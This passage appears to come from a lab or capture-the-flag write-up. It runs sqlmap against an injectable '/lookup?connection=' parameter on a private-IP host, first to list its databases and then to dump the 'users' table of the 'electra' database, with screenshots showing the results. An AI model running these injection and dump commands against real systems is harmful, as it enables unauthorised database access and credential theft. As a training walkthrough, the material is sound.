We already know that `/lookup?connection=` is injectable so we'll begin with running sqlmap against it. `sqlmap -u "http://192.168.77.80/lookup?connection=1" --batch --dbs` turns up the following warning:

<img width="1803" height="357" alt="image" src="https://github.com/user-attachments/assets/5e15bf32-7134-49b9-8e56-5581f9b82ede" />

We then run `sqlmap -u "http://192.168.77.80/lookup?connection=1" --batch -D electra -T users --dump` which provides us with the dumped users table:

<img width="1929" height="718" alt="image" src="https://github.com/user-attachments/assets/baf08b30-b3ce-4880-938e-c4e4284db678" />


<img width="1915" height="727" alt="image" src="https://github.com/user-attachments/assets/4a790740-73e4-45ef-aae6-c8fe640aaf6d" />

